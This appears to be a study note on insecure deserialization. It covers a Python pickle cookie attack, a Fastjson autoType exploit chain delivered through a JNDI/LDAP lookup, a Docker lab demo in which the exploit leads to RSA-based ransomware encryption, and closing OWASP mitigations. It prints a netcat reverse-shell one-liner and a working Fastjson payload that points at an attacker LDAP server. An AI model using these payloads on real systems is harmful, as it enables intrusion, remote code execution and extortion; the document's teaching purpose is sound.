
# How much will you pay

## 1. Introduction

### What is `Serialization`

Serialization is the process of converting object into byte stream so that it can be saved to memory, file or database. %%This process of serializing an object is also called ***marshalling*** an object in some situations.%%

%%XML serialization serializes the public fields and properties of an object, or the parameters and return values of methods, into an XML stream that conforms to a specific XML Schema definition language (XSD) document. XML serialization results in strongly typed classes with public properties and fields that are converted to XML.%%

![[Pasted image 20211014134328.png]]

### What is `DE-Serialization`

Deserialization is the reverse process of serialization. It means you can ***restore*** the object from byte stream.

![[Pasted image 20211014134501.png]]

### Why `insecure`

Simply, insecure deserialization occurs when data from an `untrusted` party (I.e. a hacker) gets `executed` because there is **no filtering or input validation**; the system *assumes* that the data is trustworthy and will execute it no holds barred.

## 2. A simple example

### The vulnerable web application
- An application to accept user input

![[Pasted image 20211011143151.png|450]]

- User input (*My Comments*) is encoded and stored inside a cookie before sending back to backend server

![[Pasted image 20211014135924.png]]

When you *Submit Feedback* in the web application, a cookie is ***encoded*** and stored within your browser - perfect for us to modify!

- The encoded cookie, sent from client side, is unfortunately `fully-trusted` and deserialized

![[Pasted image 20211011143011.png]]

Once you visit the feedback form, the value of this cookie is ***decoded*** and then `deserialize`. In the snippet above, we can see how the cookie is retrieved and then deserialized via `pickle.loads`


### Attack on this vulnerable application
- `Serialize` and then ***encode*** a malicious payload
A python class, with malicious payload (`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.192 4444 > /tmp/f`) that is serialized to bytes:

![[Pasted image 20211011143653.png]]

- The output (the byte stream) looks like:

![[Pasted image 20211011144233.png]]

- Modify the `encodedPayloadCookie` by copying and pasting the above byte string into the "encodedPayload" cookie in your browser:

![[Pasted image 20211011144407.png]]

Now, the malicious code in the cookie will be executed (as a reverse shell).


## 3. Mingled with `Ransomware`

How about an **insecure Deserialization** vulnerability happens to be *mixed* with **ransomware**?

### What is Ransomware?

Ransomware is **a form of malware designed to encrypt files on a device**. Malicious actors then demand ransom in exchange for decryption.

### WannaCry - A typical ransomware

The WannaCry ransomware attack was a worldwide cyberattack in May 2017 by the WannaCry ransomware cryptoworm, which targeted computers running the Microsoft **Windows** operating system by **encrypting** data and demanding ransom payments in the **Bitcoin** cryptocurrency. It propagated through `EternalBlue`, an exploit developed by the United States National Security Agency (NSA) for older Windows systems.

While Microsoft had released patches previously to close the exploit, much of WannaCry's spread was from organizations that had **not** applied these, or were using older Windows systems that were past their end-of-life. These patches were imperative to an organization's cyber-security but many were not applied because of `neglect`, `ignorance`, `mismanagement`, or a `misunderstanding` about their importance.

A new variant of WannaCry forced `Taiwan Semiconductor Manufacturing Company` (TSMC - `台积电`) to temporarily **`shut down`** several of its chip-fabrication factories in August 2018. The virus spread to **10,000** machines in TSMC's most advanced facilities.


### `Fastjson` - An infamouse Java library with insecure deserialization

* What is **Fastjson**
Fastjson is a Java library that can be used to convert Java Objects into their JSON representation. It can also be used to convert a JSON string to an equivalent Java object. Fastjson can work with **arbitrary** Java objects including pre-existing objects that you do not have source-code of.

* Fastjson is subject to **insecure deserialization**
Like Jackson(-Databind) and other JSON serialization libraries Fastjson comes with a so-called AutoType-feature, which instructs the library to deserialize JSON input using types provided by the JSON (using an extra JSON field called `@type`). Now we know that deserializing **ANY** input where the types can be provided is potentially insecure and dangerous. And that is especially true if the types can be provided from a **remote** user (like a JSON object or a ViewState).

An example of such a gadget would be the JDK class `javax.swing.JEditorPane`, that worked until Fastjson 1.2.68 (released in March of 2020).

A simple payload using that gadget would look like this:

```json
{"@type":"javax.swing.JEditorPane","page": "https://sectests.net/canary/sample"}
```

If Fastjson before the version 1.2.69 with autoType enabled is in use and the payload above is parsed it instantiates the JDK class `javax.swing.JEditorPane` and calls its `setPage` method, which in turn makes a simple HTTP `GET` request to the URL specified. (As said before this gadget is mostly interesting for the remote detection of a vulnerable application using Fastjson.)


### Fastjson attacking flow

#### Fastjson detection
- A *NORMAL* input
```json
root@Attacker:/opt/utils/malware# curl -X POST --data '{"Name": "abcde"}' --header 'Content-Type: application/json' http://10.160.0.254:8090
{
        "age":20,
        "name":"abcde"
}
```
- A **malformed** payload (with unmatched curved parentheses)
```json
root@Attacker:/opt/utils/malware# curl -X POST --data '{"Name": "abcde"' --header 'Content-Type: application/json' http://10.160.0.254:8090
{
        "timestamp":1634542497475,
        "status":400,
        "error":"Bad Request",
        "message":"JSON parse error: not match : - \u001A, info : pos 16, json : {\"Name\": \"abcde\"; nested exception is com.alibaba.fastjson.JSONException: not match : - \u001A, info : pos 16, json : {\"Name\": \"abcde\"",
        "path":"/"
}root@Attacker:/opt/utils/malware# 

```

From the above output, we can see the error message is given by `com.alibaba.fastjson.JSONException`

#### Fastjson 1.2.47 attacking payload

`Content-Type: application/json`
```json
{
    "Round 1":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "Round 2":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://10.160.0.10:9999/Attacker",
        "autoCommit":true
    }
}
```

#### Fastjson in-detail
##### Round 1
```json
"Round 1":{
	"@type":"java.lang.Class",
	"val":"com.sun.rowset.JdbcRowSetImpl"
}
```
`java.lang.Class` is in the `white list` and there's no autoType check for this type. When `autotype` is `false`, the class designated by `val`, here the malicious class `com.sun.rowset.JdbcRowSetImpl`, will be loaded into ==cache==, entitled as ==type==: `java.lang.Class` (the ==class name== however is still `com.sun.rowset.JdbcRowSetImpl`).

##### Round 2
```json
"Round 2":{
	"@type":"com.sun.rowset.JdbcRowSetImpl",
	"dataSourceName":"ldap://10.160.0.10:9999/Attacker",
	"autoCommit":true
}
```
When `autotype` is `false` and the class name specified by `@type` exists in the cache, it will be used for the deserialization - the `dataSourceName` will be ==assigned== to the malicious class `com.sun.rowset.JdbcRowSetImpl`:
![[Pasted image 20210815211126.png]]

The `setDataSourceName` method of `JdbcRowSetImpl` class is invoked when the `autoCommit` is set to **true**:
![[Pasted image 20210815211406.png]]

`this.connect()` will be executed:
![[Pasted image 20210815211539.png]]

Inside the `connect()`, the remote JNDI will be connected and the remote malicous code will be executed:
![[Pasted image 20210815211908.png]]

### A demo: ransomware by exploiting insecure deserialization

#### Introduction of the demo

1. It's only a demo attack and thus there're pretty many simplified settings
2. The environment employ Docker compose containing two containers: one for the victim, a web server and an attacker. The demo has been uploaded to GitHub at: https://github.com/dyingc/insecure_deserialization.git
3. The server runs a vulnerable application with `fastjson 1.2.45`
4. The attacker is used to demo an infected node, like a reckless administrator who happens to open an email with malicious payload
5. The attacking code is written in Java, just for simplification purpose
6. The encryption uses RSA 2048 which means there's `no practical` way to decrypt the encrypted files without the private key
7. For simplification purpose, the keys are generated and stored on the attacker node while in real scenario, they're stored remotely and only public key, the one used for encryption, is stored on the attacker node
8. The attacker attacks the server's interface processed by fastjson and force the latter to furtherly download more attacking material from the attacker node and encrypt one file (**/tmp/test/myfile**) for demonstration



#### Explanation of the attacking and recover flows

- Attack

![[C47B8CB3-FA94-4279-B002-AE08CF201BAC.jpeg]]

1. Attacker ***A*** sends the malicious JSON payload to ***F***, the victim node who has the vulnerable `fastjson` installed
2. ***F***, the victim, tries to deserialize some *byte-stream* into `com.sun.rowset.JdbcRowSetImpl`
3. ***F*** does a remote LDAP lookup, trying to locate the *byte-stream*. This LDAP lookup service is started on ***L***, hosted on the Attacker node
4. ***L*** redirects the lookup to a simple HTTP service, ***H***, from which a malicious `Attacker.class` is served
5. ***F***, the victim, blindly and happily retrieves the malickous class bytes and loaded into its memory, resulting the execution of the *static block* defined in this `Attacker.class`
6. Driven by `Attacker.class`, ***F*** downloads more *supporting files* (`attacking_package.zip`) from the simple HTTP service, hosted on the attacker node
7. The downloaded and extracted code furtherly encrypts the ***F***'s **/tmp/test/myfile** using RSA `hybrid` algorithm:
	1. A random AES 128 key is generated
	2. The AES key is used to encrypt the file
	3. The AES key is encrypted by the public key inside the zip file, using RSA-2048
	4. The AES key is removed

- Recover

1. After the victim pays the ransom, the attacker node shares the private key, which is associated with the specific ***TargetID***. Three Java classes to do the decryption task will also be provided
2. The victim decrypts the encrypted file using the provided private key


#### Demo

##### Attack
- Attacker
1. Run the `start.sh` under `/opt/utils/malware`
2. Check the status
```bash
root@Attacker:/tmp/test# ss -naltupe
Netid    State     Recv-Q    Send-Q         Local Address:Port          Peer Address:Port    Process                                                      
tcp      LISTEN    0         5                    0.0.0.0:9000               0.0.0.0:*        users:(("python3",pid=258,fd=3)) ino:5571814 sk:100c <->    
tcp      LISTEN    0         128                  0.0.0.0:9999               0.0.0.0:*        users:(("java",pid=259,fd=26)) ino:5571821 sk:100d <->      
root@Attacker:/tmp/test# 
```
The `java` process is the JNDI/LDAP listening process while the `python3` is the simple HTTP service holder.
3. Check the attacker side output
```bash
root@Attacker:/tmp/test# ls -lhrt
total 68K
drwxr-xr-x 2 root root 4.0K Oct 13 10:12 Symmetric
-rw-r--r-- 1 root root 2.3K Oct 13 10:12 StartEncryption.class
-rw-r--r-- 1 root root 1.6K Oct 13 10:12 GenerateSymmetricKey.class
-rw-r--r-- 1 root root 2.2K Oct 13 10:12 GenerateKeys.class
-rw-r--r-- 1 root root 1.8K Oct 13 10:12 EncryptKey.class
-rw-r--r-- 1 root root 1.8K Oct 13 10:12 EncryptData.class
-rw-r--r-- 1 root root 1.5K Oct 13 10:12 DecryptKey.class
-rw-r--r-- 1 root root 2.4K Oct 13 10:12 DecryptFile.class
-rw-r--r-- 1 root root 1.9K Oct 13 10:12 DecryptData.class
-rw-r--r-- 1 root root 2.4K Oct 13 10:12 AttackerPrep.class
-rw-r--r-- 1 root root 6.0K Oct 13 10:12 Attacker.class
-rw-r--r-- 1 root root  16K Oct 13 10:12 attacking_package.zip
drwxr-xr-x 2 root root 4.0K Oct 13 10:12 KeyPair
root@Attacker:/tmp/test# ls -lh Symmetric/
total 8.0K
-rw-r--r-- 1 root root 256 Oct 13 10:12 encSecretKey_g4HgBTRGW7wRyGCZcKfd0PMQjBcLV-iquTxC1BinPhw
-rw-r--r-- 1 root root  16 Oct 13 10:12 secretKey_g4HgBTRGW7wRyGCZcKfd0PMQjBcLV-iquTxC1BinPhw
root@Attacker:/tmp/test# ls -lh KeyPair/
total 8.0K
-rw-r--r-- 1 root root 1.2K Oct 13 10:12 privKey_g4HgBTRGW7wRyGCZcKfd0PMQjBcLV-iquTxC1BinPhw
-rw-r--r-- 1 root root  294 Oct 13 10:12 publicKey_g4HgBTRGW7wRyGCZcKfd0PMQjBcLV-iquTxC1BinPhw
root@Attacker:/tmp/test# 

```
The `g4HgBTRGW7wRyGCZcKfd0PMQjBcLV-iquTxC1BinPhw` is the **TargetID** of the victim.

- Victim
1. Check the file-to-be-encrypted
```bash
root@Victim:/tmp/test# echo `date` >> myfile ; cat myfile 
This is some data
Wed Oct 13 10:00:57 UTC 2021
root@Victim:/tmp/test# 
```
2. Wait Attacker's attack
3. Check the output of the attack
```bash
root@Attacker:/tmp/test# ls -lhrt --color
total 60K
-rw-r--r-- 1 root root   48 Oct 13 10:12 myfile_g4HgBTRGW7wRyGCZcKfd0PMQjBcLV-iquTxC1BinPhw
drwxr-xr-x 2 root root 4.0K Oct 13 10:12 Symmetric
drwxr-xr-x 2 root root 4.0K Oct 13 10:12 KeyPair
root@Attacker:/tmp/test# ls -lhrt Symmetric/
total 4.0K
-rw-r--r-- 1 root root 256 Oct 13 10:12 encSecretKey_g4HgBTRGW7wRyGCZcKfd0PMQjBcLV-iquTxC1BinPhw
root@Attacker:/tmp/test# ls -lhrt KeyPair/
root@Attacker:/tmp/test# 
```

##### Recover

In order to simplify the demo, a shared storage `/data` between the attacker and victim will be used to store the private key, provided by the attacker, after the ransom is received.

- Victim

1. Victim provides the **TargetID** to the attacker (after ransom is paid)
2. Victim gets the private key together with the three Java classes started with *Decrypt*
```bash
root@Victim:/tmp/test# ls -lh KeyPair/
root@Victim:/tmp/test# mv /data/Decrypt*class . ; mv /data/privKey_g4HgBTRGW7wRyGCZcKfd0PMQjBcLV-iquTxC1BinPhw KeyPair/
root@Attacker:/tmp/test# ls -lh
total 24K
-rw-r--r-- 1 root root 1.9K Oct 13 10:31 DecryptData.class
-rw-r--r-- 1 root root 2.6K Oct 13 10:31 DecryptFile.class
-rw-r--r-- 1 root root 1.5K Oct 13 10:31 DecryptKey.class
drwxr-xr-x 2 root root 4.0K Oct 13 10:22 KeyPair
drwxr-xr-x 2 root root 4.0K Oct 13 10:22 Symmetric
-rw-r--r-- 1 root root   48 Oct 13 10:22 myfile_g4HgBTRGW7wRyGCZcKfd0PMQjBcLV-iquTxC1BinPhw
root@Attacker:/tmp/test# 
root@Victim:/tmp/test# ls -lh KeyPair/
total 8.0K
-rw-r--r-- 1 root root 1.2K Oct 13 10:22 privKey_g4HgBTRGW7wRyGCZcKfd0PMQjBcLV-iquTxC1BinPhw
root@Victim:/tmp/test# 

```
3. Victim decrypts the encrypted file
```bash
root@Victim:/tmp/test# java DecryptFile g4HgBTRGW7wRyGCZcKfd0PMQjBcLV-iquTxC1BinPhw
The file was successfully decrypted. You can view it in: /tmp/test/decrypted/myfile
root@Victim:/tmp/test# 
```
4. Check the contents of the decrypted file
```bash
root@Victim:/tmp/test# cat /tmp/test/decrypted/myfile 
This is some data
Wed Oct 13 10:00:57 UTC 2021
```

- Attacker
1. Attacker provides the private key associated with the **TargetID**
```bash
root@Attacker:/tmp/test# ls -lhrt KeyPair/privKey_*                                           
-rw-r--r-- 1 root root 1.2K Oct 13 10:12 KeyPair/privKey_g4HgBTRGW7wRyGCZcKfd0PMQjBcLV-iquTxC1BinPhw
root@Attacker:/tmp/test# cp Decrypt*class /data; cp KeyPair/privKey_g4HgBTRGW7wRyGCZcKfd0PMQjBcLV-iquTxC1BinPhw /data
root@Attacker:/tmp/test# ls -lh /data
total 16.0K
-rw-r--r-- 1 root root 1.9K Oct 13 10:22 DecryptData.class
-rw-r--r-- 1 root root 2.6K Oct 13 10:22 DecryptFile.class
-rw-r--r-- 1 root root 1.5K Oct 13 10:22 DecryptKey.class
-rw-r--r-- 1 root root 1.2K Oct 13 10:22 privKey_g4HgBTRGW7wRyGCZcKfd0PMQjBcLV-iquTxC1BinPhw
root@Attacker:/tmp/test# 
```


## 5. Mitigation
[OWASP 2017 Reference](https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization)

The only safe architectural pattern is **`not`** to accept serialized objects from **`untrusted`** sources or to use serialization mediums that only permit primitive data types. If that is not possible, consider one of more of the following:  
* Implementing **integrity checks** such as digital signatures on any serialized objects to prevent hostile object creation or data tampering.  
* Enforcing **strict type constraints** during deserialization before object creation as the code typically expects a definable set of classes. Bypasses to this technique have been demonstrated, so reliance solely on this is not advisable.  
* **Isolating** and running code that deserializes in low privilege environments when possible.  
* **Log** deserialization exceptions and failures, such as where the incoming type is not the expected type, or the deserialization throws exceptions.  
* Restricting or monitoring incoming and outgoing **network connectivity** from containers or servers that deserialize.  
* Monitoring deserialization, alerting if a user **deserializes constantly**.

